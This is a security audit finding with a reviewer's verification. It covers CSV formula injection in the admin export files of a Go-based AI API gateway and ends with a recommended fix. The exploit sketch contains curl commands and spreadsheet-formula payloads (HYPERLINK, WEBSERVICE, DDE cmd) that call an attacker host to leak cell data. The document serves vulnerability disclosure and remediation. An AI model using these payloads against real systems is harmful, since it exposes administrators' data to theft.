finding.title: CSV export formula injection: gateway-controlled model / X-Request-ID columns are written unescaped into audit, token-stats and keyword CSVs downloaded for Excel
finding.category: Injection (CSV formula / DDE) in exported artifacts
finding.evidence: audit.go:99 `w := csv.NewWriter(&sb)` then audit.go:101-105 `w.Write([]string{r.RequestID, r.CreatedAt.Format(time.RFC3339), r.APIKeyLabel, r.Protocol,` / `r.ModelAlias, upstreamLabel(...), r.Status, strconv.FormatBool(r.Blocked), r.BlockReason})` — raw fields, no `=`/`+`/`-`/`@`/tab prefix neutralisation anywhere. Same pattern at audit.go:180-181 (operation logs), tokenstats.go:276-277 (API-key label) and guard.go:138 (`w.Write([]string{r.Word, r.Category, r.MatchMode, r.Action, ...})`). Both poisoned columns are reachable by a plain gateway key: gateway.go:334 `ap.alias = cr.Model` is set before resolution, so an unknown-model 404 still persists the attacker string (gateway.go:315-317 + gateway.go:257 `if status != "ok" { return true }`), and gateway.go:84 `if v := strings.TrimSpace(c.GetHeader("X-Request-ID")); v != "" && len(v) <= 128 {` puts an attacker-chosen request_id in the first CSV column. Delivery is a file download: frontend/src/api/client.ts:124-127 `responseType: 'blob'` -> client.ts:141 `a.download = filename;`.
finding.impact: One gateway call such as {"model":"=HYPERLINK(\"http://evil/\"&A1)","messages":[]} or header `X-Request-ID: @SUM(1+1)+cmd|'/C calc'!A0` writes a row that becomes an active formula the next time an admin clicks Export CSV (audit.go:108 attachment; filename=call-logs.csv). Because the data crosses a trust boundary (tenant-supplied string -> privileged analyst's spreadsheet), the result is attacker-chosen formula execution in the admin's Excel: exfiltration of adjacent cells via WEBSERVICE/HYPERLINK, or DDE prompts. Excel Protected View dampens but does not remove HYPERLINK/WEBSERVICE-class risk.
finding.mitigations_checked: SQL layer is parameterised so these strings cannot reach SQLite as SQL; the SPA renders them as React children (no dangerouslySetInnerHTML/innerHTML/new RegExp anywhere in frontend/src) so there is no DOM XSS alternative sink; /metrics escapes label values (metrics/prom.go:43-45 promEsc). Only the CSV path is unprotected.
finding.recommendation: Add one shared csvCell() helper used by every export writer: prefix any field whose first rune is = + - @ TAB or CR with a single quote (or a tab), and truncate request_id/model to their declared column widths before writing.

reason:
TECHNICAL CHAIN: CONFIRMED, every quoted line verified by reading the cited files end-to-end; only the severity and the breadth of "same pattern" are overstated, so this is a downgrade, not a refutation.

1) Evidence accuracy (all exact, no wrong-line). backend/internal/admin/audit.go:99 `w := csv.NewWriter(&sb)`; the row write starts verbatim on line 102 `w.Write([]string{r.RequestID, r.CreatedAt.Format(time.RFC3339), r.APIKeyLabel, r.Protocol,` and continues 103 `r.ModelAlias, upstreamLabel(r.UpstreamProvider, r.UpstreamModel),` / 105 `... r.Status, strconv.FormatBool(r.Blocked), r.BlockReason})` — 11 raw string fields, zero prefix neutralisation. audit.go:108 `c.Header("Content-Disposition", "attachment; filename=call-logs.csv")` and 109 `c.Data(http.StatusOK, "text/csv; charset=utf-8", []byte("\uFEFF"+sb.String()))` — the BOM only fixes Excel's charset sniffing, it does not stop a leading `=`. audit.go:177/180-181 (op logs), tokenstats.go:273/276-277, guard.go:135/138 all quote-verified. The finding's "audit.go:101-105" span includes line 101 (`for _, r := range rows {`), which is a harmless range-off-by-one; the canonical `line` value 102 is exact, so no corrected_line. A grep for `csv\.NewWriter|csvCell|formula|CsvSafe|SanitizeCSV|escapeCSV` across backend/ returns exactly the 4 writer call sites and no escaping helper anywhere: the absence of neutralisation is exhaustive, not inferred.

2) Go's csv.Writer is not a mitigation. fieldNeedsQuotes() only RFC-4180-quotes (and `=HYPERLINK("http://evil/"&A1)` does get quoted because it contains `"`); quoting changes transport, not cell semantics — the cell value still begins with `=`, so Excel/LibreOffice evaluate it. Confirmed no delimiter/UseCRLF tweaks.

3) Trust boundary holds, and is actually wider than claimed for one column. gateway.go:334 `ap.alias = cr.Model` is set BEFORE alias lookup (335), context-suffix strip (339-346), implicit upstream-name resolution (351-354) and the 404 return at 348-362, so an unresolvable attacker string is what reaches auditParams.alias; the deferred sink at gateway.go:314-317 `defer func() { if shouldAuditCall(snap.General, ap.status) { s.writeLog(ap) } }` fires with ap.status still "error" from initialisation at 312, and shouldAuditCall returns true unconditionally for any non-ok status (gateway.go:257-259 `if status != "ok" { return true }`). Defaults make this fire out of the box: settings.go:31-33 `CallAuditEnabled: true, CallAuditSampling: 1` with CallAuditOnlyErrors left at zero-value false. Note the request_id column needs no 404 at all: sampling=1 + only-errors=false means EVERY gateway call (including 200 OK) is persisted, so gateway.go:83-88 `if v := strings.TrimSpace(c.GetHeader("X-Request-ID")); v != "" && len(v) <= 128 { return v }` — a length-only check, no charset/grammar validation — lets a tenant place arbitrary printable bytes in CSV column 1 on successful traffic. writeLog (gateway.go:270-281) copies both verbatim; audit.Logger.Write (backend/internal/audit/audit.go:37-47) and writerLoop (67, `l.db.CreateInBatches`) do no truncation. The GORM width tags (model.go:248 `RequestID string \`gorm:"uniqueIndex;size:40"\``; 253 `ModelAlias string \`gorm:"size:64;index"\``) are DDL type hints SQLite does not enforce, and realistic payloads fit inside them anyway (`=HYPERLINK("http://evil/"&A1)` = 29 runes < 64; `@SUM(1+1)+cmd|'/C calc'!A0` = 26 runes < 40), so the recommendation's "truncate to declared widths" is hygiene, not a blocker.

4) Delivery confirmed: all four export routes are registered with admin JWT (routes.go:77,113,115,122) and the SPA wires them to a real file download — endpoints.ts:200-204 `downloadFile('/audit/calls/export', ...)`, client.ts:126 `responseType: 'blob'`, client.ts:141 `a.download = filename;` with filename taken from the server's Content-Disposition (client.ts:129-137), i.e. the artifact lands on disk as .csv and is opened by a desktop spreadsheet.

5) Claimed mitigations are honest, and I re-verified them: parameterised queries throughout callLogQuery (audit.go:116-137); grep for `dangerouslySetInnerHTML|innerHTML|new RegExp|eval\(` over frontend/src returns zero matches, so there is no DOM sink for these strings; prom.go:43-45 `func promEsc(s string) string { return strings.NewReplacer(...) }` exists as stated. So the CSV path genuinely is the only unprotected exit.

WHAT I DO DOWNGRADE / CORRECT.
(a) Scope overreach in the title. Only the call-logs export crosses a privilege boundary. tokenstats.go:276-277 writes `r.label`, which is either `model.APIKey.Name` (tokenstats.go:258 `mergedRow{id: k.ID, label: k.Name, ...}`; gateway.go:311 `keyLabel: apiKey.Name`) or `MAX(api_key_label)` for deleted keys (tokenstats.go:238) — always admin-authored via routes.go:129 POST /apikeys. guard.go:138 writes `r.Word`, admin-authored via guard.go:44-61 behind admin JWT. audit.go:180-181: Operator comes from the JWT subject or `u.Username` (auth.go:132 `s.recordOp(c, "login", "auth", u.Username, nil, nil)` — only on SUCCESSFUL login; the 401 paths at auth.go:35,78 never call recordOp, so there is no unauthenticated username-injection variant), Target/BeforeJSON/AfterJSON are admin config payloads, IP is server-derived. Critically, audit.go:105 `r.BlockReason` also embeds only admin-authored rule text — engine.go:81 `fmt.Sprintf("命中敏感词策略 [%s/%s]", kw.Raw.Category, f.Value)` with `f.Value` = `display(kw.Raw.Word)` (engine.go:77), plus 103/117/139 (`r.Raw.Name`, `inj.Raw.Name`) — never attacker prompt text. So those three exports are self-poisoning within one privilege class; they still deserve the same csvCell() fix, but they are not the attack surface the title asserts.
(b) Impact overstated for high. Exploitation is second-order and gated on three things: an admin must click Export AND open the same-origin file in a desktop spreadsheet AND click "Enable Editing" past Protected View (browser downloads carry Mark-of-the-Web). The only code-execution primitive named — `cmd|'/C calc'!A0` DDE — is blocked by default in modern Excel Trust Center and prompts even when permitted; what survives Enable-Editing is HYPERLINK/WEBSERVICE-class disclosure. And the disclosure target is small: audit.go:100's header shows the export carries only 11 metadata columns (request_id, created_at, api_key label, protocol, model, upstream, tokens, latency, status, blocked, reason) — no credentials, and no prompt/completion content, because grep for `InputText|OutputText` in admin/ shows those are only ever emitted through the JSON detail API (audit.go:81-82), never a CSV writer. Finally the attack is self-attributing: gateway.go:311 records the caller's own key label/id in the same row, so a tenant poisoning exports is trivially identifiable to the admin they are attacking. Per the rubric (high = authed-but-severe), a real-but-defenceless-on-open, metadata-only, victim-click-gated sink is "defense-in-depth gap with real impact" = medium. The fix recommendation is correct and cheap and should still be applied to all four writers.
exploit_sketch:
Precondition: attacker holds a legitimate gateway API key (any tenant, no admin rights); default settings (settings.go:33 CallAuditEnabled: true, CallAuditSampling: 1).

Step 1 — poison the `model` column (audit.go:103) via the 404 path:
  curl -sS https://gateway.example.com/v1/chat/completions \
    -H 'Authorization: Bearer sk-<own-key>' -H 'Content-Type: application/json' \
    -d '{"model":"=HYPERLINK("http://attacker.tld/leak?r="&A2)","messages":[{"role":"user","content":"hi"}]}'
  -> adapter.parseOpenAIChat only checks `raw.Model == ""` (adapter.go:120-122), so the string survives; gateway.go:334 `ap.alias = cr.Model`; gateway.go:348-362 404s without clearing it; the deferred writeLog (gateway.go:314-317 + 257-259) persists `model_alias` verbatim. Response is a harmless 404 — no admin sees anything.

Step 2 — poison column 1 `request_id` (audit.go:102), which works on ANY call status, including 200 OK:
  curl -sS https://gateway.example.com/v1/chat/completions \
    -H 'Authorization: Bearer sk-<own-key>' -H "X-Request-ID: =WEBSERVICE('http://attacker.tld/c?k='+SUBSTITUTE(LEFT(A2,64),\" \",\"%20\"))" \
    -H 'Content-Type: application/json' -d '{"model":"gpt-mini","messages":[{"role":"user","content":"hi"}]}'
  -> gateway.go:84 accepts it (26..128 printable bytes, no CR/LF needed) and gateway.go:308 even echoes it back, so the attacker confirms placement.

Step 3 — wait for the legitimate workflow. An analyst later opens 审计日志 > 导出 CSV (endpoints.ts:200-204) and Excel opens call-logs.csv (audit.go:108 attachment) after one "Enable Editing" click. Cell in the model column (row N) evaluates HYPERLINK/WEBSERVICE, letting the attacker read adjacent cells (other tenants' request IDs, api_key labels, model aliases, block reasons) or render a convincing `https://login.corp/` link inside an official-looking audit export. `@SUM(1+1)+cmd|'/C calc'!A0` is the same write-up but needs DDE enabled, which modern Excel blocks by default — this is why I score medium, not high.

Amplification note: the 404 path returns before rate limiting (gateway.go:410 is step 3, after the model resolution that already returned), so a tenant can seed unlimited poisoned rows, one per request, and can retarget each row by changing the X-Request-ID (the uniqueIndex on model.go:248 is the only thing that would collide).

Fix: route every field through one helper before `w.Write`, applied at all 4 writers (audit.go:102, audit.go:180, tokenstats.go:276, guard.go:138):
  func csvCell(s string) string { if s == "" { return s }; switch s[0] { case '=', '+', '-', '@', '\t', '\r': return "'" + s }; return s }
Note this must be a quote/tab prefix, not Go's quoting (which csv.Writer already does and which does not neutralise a leading '='), and stripping CRLF is not required — Go's writer already quotes them, so CSV row-splitting is not the risk here.

additional_notes.evidence_line_check: all quotes verbatim-correct; canonical line 102 exact; the "101-105" span in the evidence text is one line wide of the actual w.Write start but does not affect the finding
additional_notes.scope_correction: privilege-crossing columns are only audit.go:102 (request_id) and audit.go:103 (model_alias); tokenstats.go:276-277, guard.go:138, audit.go:180-181 and the BlockReason column at audit.go:105 are admin-authored
additional_notes.severity_rationale: victim-click-gated + Protected View + DDE blocked by default + exported CSV contains no credentials and no prompt/completion text + attacker self-identifies via api_key label => medium (defense-in-depth), not high
